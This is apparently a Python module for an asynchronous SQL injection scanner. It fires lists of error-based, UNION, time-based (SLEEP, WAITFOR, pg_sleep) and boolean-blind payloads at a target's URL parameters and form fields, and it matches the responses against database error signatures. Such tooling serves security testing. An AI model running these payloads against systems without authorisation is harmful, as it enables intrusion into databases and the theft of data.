import asyncio
from dataclasses import dataclass, field
from typing import Optional
from datetime import datetime
from utils.http_client import HTTPClient, ClientConfig
from bs4 import BeautifulSoup


SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1'/*",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' UNION SELECT NULL--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' OR ''='",
    "' OR 'x'='x",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "admin'--",
    "admin' #",
    "' OR 1=1--",
]

# Payloads designed to induce a measurable time delay (time-based blind)
TIME_BASED_PAYLOADS = [
    "' OR SLEEP(5)--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' OR BENCHMARK(5000000,MD5('a'))--",
    "1 AND pg_sleep(5)--",
    "' OR (SELECT * FROM (SELECT SLEEP(5))a)--",
]

# (true_condition, false_condition) pairs for boolean-based blind detection
BOOLEAN_BLIND_PAIRS = [
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1'--", "1' AND '1'='2'--"),
    ("' OR 'a'='a'--", "' OR 'a'='b'--"),
]

ERROR_SIGNATURES = [
    # MySQL
    "mysql_fetch_array",
    "mysql_num_rows",
    "MySQLSyntaxErrorException",
    "MySQLiPrepareException",
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "mysql_fetch",
    "mysql_result",
    # Oracle
    "ORA-01756",
    "ORA-00933",
    "ORA-00907",
    "ORA-01722",
    "oracle error",
    # MSSQL
    "SQLServer JDBC Driver",
    "Microsoft SQL Native Error",
    "microsoft ole db provider for sql server",
    "odbc microsoft access driver",
    "syntax error converting",
    "sqlexception",
    # PostgreSQL
    "PostgreSQL query failed",
    "psql:",
    "Warning: pg_",
    "valid PSQL",
    "pg_query",
    "pgsql",
    # SQLite
    "SQLite/JDBCDriver",
    "sqlite3.OperationalError",
    "sqlite_error",
    # Generic
    "SQL syntax",
    "SQL error",
    "unterminated",
    "syntax error",
    "quoted string not properly terminated",
]

# Deduplicate (lowercased signatures used at match time)
ERROR_SIGNATURES = list(dict.fromkeys(ERROR_SIGNATURES))

# Time threshold (seconds) to flag time-based blind SQLi
TIME_BASED_THRESHOLD = 4.0


@dataclass
class SQLiVulnerability:
    url: str
    payload: str
    type: str
    evidence: str


@dataclass
class SQLiResult:
    target: str
    start_time: datetime
    end_time: datetime
    vulnerabilities: list[SQLiVulnerability] = field(default_factory=list)
    tested: int = 0
    errors: int = 0
    vulnerable: bool = False
    payload: str = ""


async def _test_payload(
    client: HTTPClient,
    base_url: str,
    param: str,
    payload: str,
) -> Optional[SQLiVulnerability]:
    """Error-based SQLi detection via GET."""
    test_url = f"{base_url}?{param}={payload}"
    response = await client.get(test_url)

    if response.error:
        return None

    body = (response.body or "").lower()

    for sig in ERROR_SIGNATURES:
        if sig.lower() in body:
            return SQLiVulnerability(
                url=test_url,
                payload=payload,
                type="error-based",
                evidence=f"Error signature: {sig}",
            )

    return None


async def _test_time_based(
    client: HTTPClient,
    base_url: str,
    param: str,
) -> Optional[SQLiVulnerability]:
    """Time-based blind SQLi: flags when response latency exceeds threshold."""
    for payload in TIME_BASED_PAYLOADS:
        test_url = f"{base_url}?{param}={payload}"
        response = await client.get(test_url)
        if response.error:
            continue
        if response.latency >= TIME_BASED_THRESHOLD:
            return SQLiVulnerability(
                url=test_url,
                payload=payload,
                type="blind-time",
                evidence=f"Response delayed {response.latency:.1f}s (threshold {TIME_BASED_THRESHOLD}s)",
            )
    return None


async def _test_boolean_blind(
    client: HTTPClient,
    base_url: str,
    param: str,
) -> Optional[SQLiVulnerability]:
    """Boolean-based blind SQLi: compares true/false condition responses."""
    for true_payload, false_payload in BOOLEAN_BLIND_PAIRS:
        true_url = f"{base_url}?{param}={true_payload}"
        false_url = f"{base_url}?{param}={false_payload}"

        true_resp = await client.get(true_url)
        false_resp = await client.get(false_url)

        if true_resp.error or false_resp.error:
            continue

        true_body = true_resp.body or ""
        false_body = false_resp.body or ""

        # Significant length difference indicates conditional branching
        len_diff = abs(len(true_body) - len(false_body))
        if len_diff > 20 and true_body != false_body:
            return SQLiVulnerability(
                url=true_url,
                payload=true_payload,
                type="blind-boolean",
                evidence=(
                    f"True/false responses differ by {len_diff} bytes "
                    f"({true_payload!r} vs {false_payload!r})"
                ),
            )
    return None


def _extract_forms(html: str, base_url: str) -> list[dict]:
    """Parse <form> elements and return list of {action, method, fields}."""
    from urllib.parse import urljoin

    try:
        soup = BeautifulSoup(html, "lxml")
    except Exception:
        soup = BeautifulSoup(html, "html.parser")

    forms = []
    for form in soup.find_all("form"):
        raw_action = form.get("action") or ""
        action = str(raw_action) if raw_action else base_url
        if not action.startswith("http"):
            action = urljoin(base_url, action)
        raw_method = form.get("method") or "get"
        method = str(raw_method).lower()
        fields = [
            str(inp.get("name"))
            for inp in form.find_all(["input", "textarea", "select"])
            if inp.get("name")
        ]
        if fields:
            forms.append({"action": action, "method": method, "fields": fields})
    return forms


async def _test_payload_post(
    client: HTTPClient,
    action: str,
    field_names: list[str],
    payload: str,
) -> Optional[SQLiVulnerability]:
    """Error-based SQLi detection via POST form submission."""
    for field in field_names:
        data = {f: "1" for f in field_names}
        data[field] = payload
        response = await client.post(action, data=data)
        if response.error:
            continue
        body = (response.body or "").lower()
        for sig in ERROR_SIGNATURES:
            if sig.lower() in body:
                return SQLiVulnerability(
                    url=action,
                    payload=payload,
                    type="error-based",
                    evidence=f"Error signature via POST field '{field}': {sig}",
                )
    return None


async def probe_sqli(
    target: str,
    max_payloads: int = 20,
    threads: int = 5,
) -> SQLiResult:
    start_time = datetime.now()
    result = SQLiResult(target=target, start_time=start_time, end_time=start_time)

    base_url = target.split("?")[0]
    param_names: list[str] = []
    if "?" in target and "=" in target:
        _, params = target.split("?", 1)
        param_names = [p.split("=")[0] for p in params.split("&") if "=" in p]

    config = ClientConfig(rate_limit=0.2)
    client = HTTPClient(config)

    vulnerabilities: list[SQLiVulnerability] = []
    errors = 0
    tested = 0

    async with client:
        semaphore = asyncio.Semaphore(threads)

        # Fetch page to discover HTML forms for POST scanning
        page_response = await client.get(target)
        forms: list[dict] = []
        if not page_response.error and page_response.body:
            forms = _extract_forms(page_response.body, base_url)

        async def limited_test_get(payload: str) -> Optional[SQLiVulnerability]:
            nonlocal errors, tested
            for param in param_names:
                async with semaphore:
                    tested += 1
                    vuln = await _test_payload(client, base_url, param, payload)
                if vuln:
                    return vuln
            return None

        async def limited_test_post(payload: str) -> Optional[SQLiVulnerability]:
            nonlocal errors, tested
            for form in forms:
                async with semaphore:
                    tested += 1
                    vuln = await _test_payload_post(
                        client, form["action"], form["fields"], payload
                    )
                if vuln:
                    return vuln
            return None

        async def limited_time_based(param: str) -> Optional[SQLiVulnerability]:
            nonlocal tested
            async with semaphore:
                tested += len(TIME_BASED_PAYLOADS)
                return await _test_time_based(client, base_url, param)

        async def limited_boolean_blind(param: str) -> Optional[SQLiVulnerability]:
            nonlocal tested
            async with semaphore:
                tested += len(BOOLEAN_BLIND_PAIRS) * 2
                return await _test_boolean_blind(client, base_url, param)

        payloads = SQLI_PAYLOADS[:max_payloads]
        get_tasks = [limited_test_get(p) for p in payloads] if param_names else []
        post_tasks = [limited_test_post(p) for p in payloads] if forms else []
        time_tasks = [limited_time_based(p) for p in param_names]
        bool_tasks = [limited_boolean_blind(p) for p in param_names]

        all_results = await asyncio.gather(
            *get_tasks, *post_tasks, *time_tasks, *bool_tasks,
            return_exceptions=True,
        )

        for r in all_results:
            if isinstance(r, SQLiVulnerability):
                vulnerabilities.append(r)
            elif isinstance(r, Exception):
                errors += 1

    if not param_names and not forms:
        result.end_time = datetime.now()
        return result

    result.vulnerabilities = vulnerabilities
    result.tested = tested
    result.errors = errors
    result.end_time = datetime.now()

    if vulnerabilities:
        result.vulnerable = True
        result.payload = vulnerabilities[0].payload

    return result
